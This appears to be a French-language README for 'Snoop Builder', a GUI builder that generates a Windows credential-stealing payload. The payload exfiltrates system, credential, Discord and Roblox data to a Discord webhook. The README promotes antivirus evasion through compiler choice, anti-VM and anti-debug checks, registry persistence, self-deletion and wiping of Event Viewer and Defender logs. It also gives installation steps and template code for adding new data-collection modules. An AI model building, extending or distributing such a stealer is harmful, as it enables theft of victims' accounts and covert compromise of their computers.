## Ce que Snoop Builder fait concrètement

<br/>

**🖥️ Interface pensée pour aller vite**
> PyQt5, frameless, sidebar à 3 onglets. Palette sombre, accent personnalisable. Tu coches, tu lances, c'est fini.

**📦 28 modules indépendants**
> Chaque module s'active ou se désactive d'un clic. Le template du payload s'adapte automatiquement — pas de code à toucher.

**🛠️ Deux compilateurs, un choix**
> PyInstaller pour la vitesse. Nuitka pour un binaire compilé C, moins signature AV. Un menu déroulant, un bouton.

**🌐 Exfiltration Discord intelligente**
> Embeds en cascade (système, credentials, Discord, Roblox, modules) + zip unique structuré en dossiers. Cap dur 6.5 Mo pour respecter la limite Discord.

**🔒 Sécurité intégrée**
> Anti-VM/Debug · Anti-Tamper · Persistance registre · Self-Delete · Nettoyage Event Viewer + Defender + WinRE.

## Compilation

<br/>

| | PyInstaller | Nuitka |
|---|---|---|
| **Vitesse** | ~30 secondes | ~5 à 15 minutes |
| **Taille** | ~10-15 Mo | ~15-25 Mo |
| **Signature AV** | Connue | Moins connue |
| **Prérequis** | `pip install pyinstaller` | `pip install nuitka` + compilateur C |

> Premier build Nuitka : téléchargement automatique de MinGW (~500 Mo). Les builds suivants sont mis en cache.

## Installation

<br/>

> **Prérequis** : [Python 3.10+](https://python.org) installé — cochez **"Add to PATH"** pendant l'installation.

<br/>

### 🪟 Windows — 2 clics

**Étape 1 — Double-cliquez sur `install.bat`**
> Installe Python (si absent), pip, PyQt5, PyInstaller, Nuitka, compilateur C et toutes les dépendances. Une seule fois.

**Étape 2 — Double-cliquez sur `start.bat`**
> Lance Snoop Builder. À chaque démarrage.

<br/>

📁 SnoopBuilder/

├── 📄 start.bat            ← 2. Double-clic ici pour lancer

├── 🐍 stealer_template.py
└── ...

```

Ajouter un module


Trois endroits à toucher, dans cet ordre.

1. Template — écrire la fonction de collecte

```python
def collect_my_module(_):
    out = os.path.join(TEMP_DIR, "my_module.txt")
    with open(out, "w", encoding="utf-8") as f:
        f.write("données collectées ici\n")
    return out
```

2. Template — déclarer le flag + enregistrer

```python
MODULE_FLAG_MY_MODULE = %%MODULE_FLAG_MY_MODULE%%

MODULES = [
    # ...
    (MODULE_FLAG_MY_MODULE, "My Module", collect_my_module,
     "01_System", "system"),
]
```

3. Builder — ajouter le nom affiché

```python
MALICIOUS_MODULES = [
    # ...
    "My Module",
]
```

C'est tout. La case à cocher apparaît, le placeholder est injecté, le module s'exécute et apparaît dans le zip final.

Architecture


Builder ↔ Template : communication par placeholders

Placeholder Rôle
%%WEBHOOK_URL%% URL d'exfiltration
%%MODULE_FLAG_<NAME>%% Activation d'un module (True/False)
%%SECURITY_<NAME>%% Activation d'une option (True/False)

Le builder normalise chaque nom (My Module / Test → MY_MODULE_TEST) et effectue les remplacements. Un garde-fou fait échouer le build si un %%...%% subsiste, en listant les placeholders restants.


```
[Interface PyQt5]
        │
        ▼
[Config JSON] → modules + sécurité + webhook
        │
        ▼
[stealer_template.py] → remplacement placeholders
        │
        ▼
[snoop_payload.py] → écrit dans le dossier de build
        │
        ▼
   ┌────┴────┐
   ▼         ▼
[.py]    [.exe via PyInstaller / Nuitka]
```
